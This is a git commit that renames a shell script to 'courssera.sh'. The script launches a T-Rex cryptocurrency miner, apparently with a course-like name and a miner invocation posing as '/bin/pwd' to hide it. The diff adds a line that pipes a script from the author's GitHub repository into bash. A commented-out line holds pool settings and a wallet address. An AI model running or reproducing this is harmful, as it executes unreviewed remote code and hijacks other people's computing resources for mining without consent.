fd94d1910f6f2fc8806b6db4d585f9aa201e825c
ALICLAYSMEN <58400825+ALICLAYSMEN@users.noreply.github.com>
2022-07-11 17:40:37 +0700

    Update and rename coursera.sh to courssera.sh

--- courssera.sh
+++ courssera.sh
@@ -9,4 +9,4 @@ chmod +x etdah
 
 #/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
 ./t-rex -c etdah
-curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/coursera.sh | bash
+curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/courssera.sh | bash
